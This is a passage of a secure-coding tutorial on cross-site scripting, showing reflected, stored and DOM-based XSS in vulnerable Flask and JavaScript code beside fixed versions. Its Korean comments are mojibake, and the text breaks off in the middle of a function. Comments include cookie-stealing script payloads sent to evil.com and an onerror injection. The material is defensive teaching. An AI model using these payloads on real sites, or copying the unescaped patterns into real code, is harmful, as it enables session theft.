<span class="c1"># ì·¨ì•½: Reflected XSS</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_vulnerable</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ì·¨ì•½: ì‚¬ìš©ì ì…ë ¥ì´ ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ HTMLì— ì§ì ‘ ì‚½ì…</span>
    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;You searched for: </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;No results found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span>

<span class="c1"># ê³µê²© URL:</span>
<span class="c1"># /search-vulnerable?q=&lt;script&gt;document.location=&#39;https://evil.com/steal?cookie=&#39;+document.cookie&lt;/script&gt;</span>
<span class="c1"># í”¼í•´ìê°€ ì´ ë§í¬ë¥¼ í´ë¦­í•˜ë©´ ì¿ í‚¤ê°€ ê³µê²©ìì—ê²Œ ì „ì†¡ë¨</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ìˆ˜ì •: ì¶œë ¥ ì¸ì½”ë”© / ì´ìŠ¤ì¼€ì´í”„</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search-secure&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_secure</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ë°©ë²• 1: ìˆ˜ë™ HTML ì´ìŠ¤ì¼€ì´í”„</span>
    <span class="n">safe_query</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;You searched for: </span><span class="si">{</span><span class="n">safe_query</span><span class="si">}</span><span class="s2">&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;No results found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span>

<span class="c1"># ì…ë ¥:  &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</span>
<span class="c1"># ì¶œë ¥: &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;</span>
<span class="c1"># ì‹¤í–‰ ê°€ëŠ¥í•œ ìŠ¤í¬ë¦½íŠ¸ê°€ ì•„ë‹Œ í…ìŠ¤íŠ¸ë¡œ ë Œë”ë§ë¨</span>


<span class="c1"># ë°©ë²• 2: Jinja2 í…œí”Œë¦¿ ì‚¬ìš© (ê¸°ë³¸ì ìœ¼ë¡œ ìë™ ì´ìŠ¤ì¼€ì´í”„ í™œì„±í™”)</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search-template&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_template</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Jinja2ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ {{ query }}ë¥¼ ìë™ ì´ìŠ¤ì¼€ì´í”„</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;You searched for: {{ query }}&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;No results found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span><span class="p">,</span> <span class="n">query</span><span class="o">=</span><span class="n">query</span><span class="p">)</span>


<span class="c1"># ê²½ê³ : Jinja2ì˜ |safe í•„í„°ì™€ Markup()ì€ ìë™ ì´ìŠ¤ì¼€ì´í”„ë¥¼ ë¹„í™œì„±í™”!</span>
<span class="c1"># ì‚¬ìš©ì ì…ë ¥ê³¼ ì ˆëŒ€ ì‚¬ìš©í•˜ì§€ ë§ ê²ƒ:</span>
<span class="c1"># {{ user_input|safe }}         â† ìœ„í—˜</span>
<span class="c1"># Markup(user_input)            â† ìœ„í—˜</span>
</code></pre></div>

<h3 id="33-stored-xss">3.3 Stored XSS<a class="header-link" href="#33-stored-xss" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">xss_stored.py - Stored XSS ì·¨ì•½ì ê³¼ ìˆ˜ì •</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">bleach</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">comments_db</span> <span class="o">=</span> <span class="p">[]</span>  <span class="c1"># ì‹œë®¬ë ˆì´ì…˜ëœ ë°ì´í„°ë² ì´ìŠ¤</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: ëŒ“ê¸€ì„ í†µí•œ Stored XSS</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/comments&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_comment_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì •ì œ ì—†ì´ ëŒ“ê¸€ ì €ì¥.&quot;&quot;&quot;</span>
    <span class="n">comment</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;author&#39;</span><span class="p">],</span>
        <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">],</span>  <span class="c1"># ìˆëŠ” ê·¸ëŒ€ë¡œ ì €ì¥!</span>
    <span class="p">}</span>
    <span class="n">comments_db</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">comment</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;added&quot;</span><span class="p">})</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/comments-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">show_comments_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì´ìŠ¤ì¼€ì´í”„ ì—†ì´ ëŒ“ê¸€ ë Œë”ë§.&quot;&quot;&quot;</span>
    <span class="n">html_parts</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Comments&lt;/h1&gt;&#39;</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">comments_db</span><span class="p">:</span>
        <span class="c1"># ì·¨ì•½: ì €ì¥ëœ ë°ì´í„°ì˜ ì§ì ‘ ì‚½ì…</span>
        <span class="n">html_parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&lt;div&gt;&lt;b&gt;</span><span class="si">{</span><span class="n">c</span><span class="p">[</span><span class="s2">&quot;author&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&lt;/b&gt;: </span><span class="si">{</span><span class="n">c</span><span class="p">[</span><span class="s2">&quot;text&quot;</span><span class="p">]</span><span class="si">}</span><span class="s1">&lt;/div&gt;&#39;</span><span class="p">)</span>
    <span class="n">html_parts</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s1">&#39;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">html_parts</span><span class="p">)</span>

<span class="c1"># ê³µê²©: POST {&quot;author&quot;: &quot;hacker&quot;, &quot;text&quot;: &quot;&lt;script&gt;new Image().src=&#39;https://evil.com/steal?c=&#39;+document.cookie&lt;/script&gt;&quot;}</span>
<span class="c1"># ëŒ“ê¸€ í˜ì´ì§€ë¥¼ ë³´ëŠ” ëª¨ë“  ì‚¬ìš©ìì˜ ì¿ í‚¤ê°€ ë„ë‚œë‹¹í•¨</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ìˆ˜ì •: ì¶œë ¥ ì‹œ ì •ì œ (ì„ íƒì ìœ¼ë¡œ ì…ë ¥ ì‹œì—ë„)</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/comments-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">add_comment_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì…ë ¥ ê²€ì¦ê³¼ í•¨ê»˜ ëŒ“ê¸€ ì €ì¥.&quot;&quot;&quot;</span>
    <span class="n">author</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;author&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">text</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="c1"># ì…ë ¥ ê²€ì¦</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">author</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">text</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Author and text required&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">author</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">100</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">5000</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Input too long&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># ì˜µì…˜ A: ëª¨ë“  HTML ì œê±° (ì¼ë°˜ í…ìŠ¤íŠ¸ ëŒ“ê¸€ìš©)</span>
    <span class="n">comment</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">author</span><span class="p">),</span>
        <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">text</span><span class="p">),</span>
    <span class="p">}</span>

    <span class="c1"># ì˜µì…˜ B: ì œí•œëœ HTML í—ˆìš© (ë¦¬ì¹˜ í…ìŠ¤íŠ¸ ëŒ“ê¸€ìš©)</span>
    <span class="c1"># bleachë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¹ì • íƒœê·¸ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸</span>
    <span class="n">comment_rich</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;author&#39;</span><span class="p">:</span> <span class="n">bleach</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="n">author</span><span class="p">,</span> <span class="n">tags</span><span class="o">=</span><span class="p">[],</span> <span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span>
        <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">bleach</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span>
            <span class="n">text</span><span class="p">,</span>
            <span class="n">tags</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">,</span> <span class="s1">&#39;i&#39;</span><span class="p">,</span> <span class="s1">&#39;em&#39;</span><span class="p">,</span> <span class="s1">&#39;strong&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;code&#39;</span><span class="p">,</span> <span class="s1">&#39;pre&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="s1">&#39;br&#39;</span><span class="p">],</span>
            <span class="n">attributes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;a&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">]},</span>
            <span class="n">protocols</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">,</span> <span class="s1">&#39;https&#39;</span><span class="p">],</span>  <span class="c1"># javascript: URL ë¶ˆê°€!</span>
            <span class="n">strip</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">),</span>
    <span class="p">}</span>

    <span class="n">comments_db</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">comment</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;added&quot;</span><span class="p">})</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/comments-secure&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">show_comments_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Jinja2 ìë™ ì´ìŠ¤ì¼€ì´í”„ë¡œ ëŒ“ê¸€ ë Œë”ë§.&quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Comments&lt;/h1&gt;</span>
<span class="s2">        {</span><span class="si">% f</span><span class="s2">or c in comments %}</span>
<span class="s2">        &lt;div&gt;</span>
<span class="s2">            &lt;b&gt;{{ c.author }}&lt;/b&gt;: {{ c.text }}</span>
<span class="s2">        &lt;/div&gt;</span>
<span class="s2">        {</span><span class="si">% e</span><span class="s2">ndfor %}</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span><span class="p">,</span> <span class="n">comments</span><span class="o">=</span><span class="n">comments_db</span><span class="p">)</span>
</code></pre></div>

<h3 id="34-dom-based-xss">3.4 DOM-Based XSS<a class="header-link" href="#34-dom-based-xss" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- dom_xss_vulnerable.html --&gt;</span>
<span class="cm">&lt;!-- ì·¨ì•½: DOM ê¸°ë°˜ XSS --&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;greeting&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">    </span><span class="c1">// ì·¨ì•½: URL fragmentì—ì„œ ì½ì–´ DOMì— ì•ˆì „í•˜ì§€ ì•Šê²Œ ì‚½ì…</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">));</span>
<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;greeting&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Hello, &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// innerHTMLì€ HTMLì„ í•´ì„í•˜ë¯€ë¡œ script íƒœê·¸ê°€ ì‹¤í–‰ë¨</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>

<span class="cm">&lt;!--</span>
<span class="cm">ê³µê²© URL: page.html#&lt;img src=x onerror=alert(document.cookie)&gt;</span>
<span class="cm">í˜ì´ë¡œë“œê°€ ì„œë²„ì— ë„ë‹¬í•˜ì§€ ì•ŠìŒ (fragmentëŠ” í´ë¼ì´ì–¸íŠ¸ ì¸¡ë§Œ)</span>
<span class="cm">--&gt;</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="cm">&lt;!-- dom_xss_fixed.html --&gt;</span>
<span class="cm">&lt;!-- ìˆ˜ì •: ì•ˆì „í•œ DOM ì¡°ì‘ --&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Welcome<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;greeting&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>

    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="w">    </span><span class="c1">// ìˆ˜ì •: innerHTML ëŒ€ì‹  textContent ì‚¬ìš©</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">decodeURIComponent</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mf">1</span><span class="p">));</span>

<span class="w">    </span><span class="c1">// ë°©ë²• 1: textContent (ì¼ë°˜ í…ìŠ¤íŠ¸ ì„¤ì •, HTML íŒŒì‹± ì—†ìŒ)</span>
<span class="w">    </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;greeting&#39;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Hello, &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">name</span><span class="p">;</span>

<span class="w">    </span><span class="c1">// ë°©ë²• 2: í…ìŠ¤íŠ¸ ë…¸ë“œ ìƒì„±</span>
<span class="w">    </span><span class="c1">// var textNode = document.createTextNode(&#39;Hello, &#39; + name);</span>
<span class="w">    </span><span class="c1">// document.getElementById(&#39;greeting&#39;).appendChild(textNode);</span>

<span class="w">    </span><span class="c1">// ë°©ë²• 3: ì •ì œ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì‚¬ìš© (DOMPurify)</span>
<span class="w">    </span><span class="c1">// import DOMPurify from &#39;dompurify&#39;;</span>
<span class="w">    </span><span class="c1">// document.getElementById(&#39;greeting&#39;).innerHTML =</span>
<span class="w">    </span><span class="c1">//     DOMPurify.sanitize(&#39;Hello, &#39; + name);</span>
<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div>

<h3 id="35-xss">3.5 XSS ì»¨í…ìŠ¤íŠ¸ë³„ ì¸ì½”ë”©<a class="header-link" href="#35-xss" title="Permanent link">&para;</a></h3>
<p>HTMLì˜ ë‹¤ë¥¸ ì»¨í…ìŠ¤íŠ¸ì—ëŠ” ë‹¤ë¥¸ ì¸ì½”ë”© ì „ëµì´ í•„ìš”í•©ë‹ˆë‹¤:</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚<span class="w">              </span>ì»¨í…ìŠ¤íŠ¸ë³„<span class="w"> </span>XSS<span class="w"> </span>ì¸ì½”ë”©<span class="w">                                </span>â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>ì»¨í…ìŠ¤íŠ¸<span class="w">             </span>í•„ìš”í•œ<span class="w"> </span>ì¸ì½”ë”©<span class="w">            </span>ì˜ˆì œ<span class="w">               </span>â”‚
â”‚<span class="w">  </span>â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="w">            </span>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="w">        </span>â”€â”€â”€â”€â”€â”€â”€â”€â”€<span class="w">         </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>HTML<span class="w"> </span>body<span class="w">            </span>HTML<span class="w"> </span>ì—”í‹°í‹°<span class="w"> </span>ì¸ì½”ë”©<span class="w">                         </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;p&gt;</span>USER_INPUT<span class="nt">&lt;/p&gt;</span><span class="w">    </span><span class="ni">&amp;lt;</span><span class="w"> </span><span class="ni">&amp;gt;</span><span class="w"> </span><span class="ni">&amp;amp;</span><span class="w"> </span><span class="ni">&amp;quot;</span><span class="w">                    </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>HTML<span class="w"> </span>attribute<span class="w">       </span>HTML<span class="w"> </span>ì†ì„±<span class="w"> </span>ì¸ì½”ë”©<span class="w"> </span>+<span class="w"> </span>ë”°ì˜´í‘œ<span class="w">                  </span>â”‚
â”‚<span class="w">  </span><span class="nt">&lt;div</span><span class="w"> </span><span class="na">title=</span><span class="s">&quot;INPUT&quot;</span><span class="nt">&gt;</span><span class="w">  </span>ë”°ì˜´í‘œ<span class="w"> </span>ì‚¬ìš©,<span class="w"> </span>&quot;<span class="w"> </span><span class="err">&amp;</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span>&gt;<span class="w"> </span>ì¸ì½”ë”©<span class="w">               </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>JavaScript<span class="w"> </span>ë¬¸ìì—´<span class="w">    </span>JavaScript<span class="w"> </span>ì¸ì½”ë”©<span class="w">                          </span>â”‚
â”‚<span class="w">  </span>var<span class="w"> </span>x<span class="w"> </span>=<span class="w"> </span>&#39;INPUT&#39;;<span class="w">     </span>\xHH<span class="w"> </span>ë˜ëŠ”<span class="w"> </span>\uHHHH<span class="w"> </span>ì¸ì½”ë”©<span class="w">                   </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>URL<span class="w"> </span>ë§¤ê°œë³€ìˆ˜<span class="w">         </span>URL/í¼ì„¼íŠ¸<span class="w"> </span>ì¸ì½”ë”©<span class="w">                          </span>â”‚
â”‚<span class="w">  </span>href=&quot;?q=INPUT&quot;<span class="w">      </span>%XX<span class="w"> </span>ì¸ì½”ë”©<span class="w">                                 </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>CSS<span class="w"> </span>ê°’<span class="w">               </span>CSS<span class="w"> </span>ì¸ì½”ë”©<span class="w">                                 </span>â”‚
â”‚<span class="w">  </span>style=&quot;color:INPUT&quot;<span class="w">  </span>\HH<span class="w"> </span>ì¸ì½”ë”©<span class="w"> </span>(ê°€ëŠ¥í•œ<span class="w"> </span>í”¼í•¨)<span class="w">                   </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â”‚<span class="w">  </span>ì¤‘ìš”:<span class="w"> </span>íŠ¹ì •<span class="w"> </span>ì»¨í…ìŠ¤íŠ¸ì—<span class="w"> </span>ë§ëŠ”<span class="w"> </span>ì¸ì½”ë”©<span class="w"> </span>ì‚¬ìš©<span class="w">                           </span>â”‚
â”‚<span class="w">  </span>JavaScript<span class="w"> </span>ë¬¸ìì—´<span class="w"> </span>ì»¨í…ìŠ¤íŠ¸ì—ì„œ<span class="w"> </span>HTML<span class="w"> </span>ì¸ì½”ë”©ì€<span class="w"> </span>ì¶©ë¶„í•˜ì§€<span class="w"> </span>ì•ŠìŒ!<span class="w">      </span>â”‚
â”‚<span class="w">                                                                  </span>â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">xss_encoding.py - ì»¨í…ìŠ¤íŠ¸ë³„ XSS ì¸ì½”ë”©</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">urllib.parse</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">markupsafe</span><span class="w"> </span><span class="kn">import</span> <span class="n">Markup</span><span class="p">,</span> <span class="n">escape</span>


<span class="k">def</span><span class="w"> </span><span class="nf">encode_for_html</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
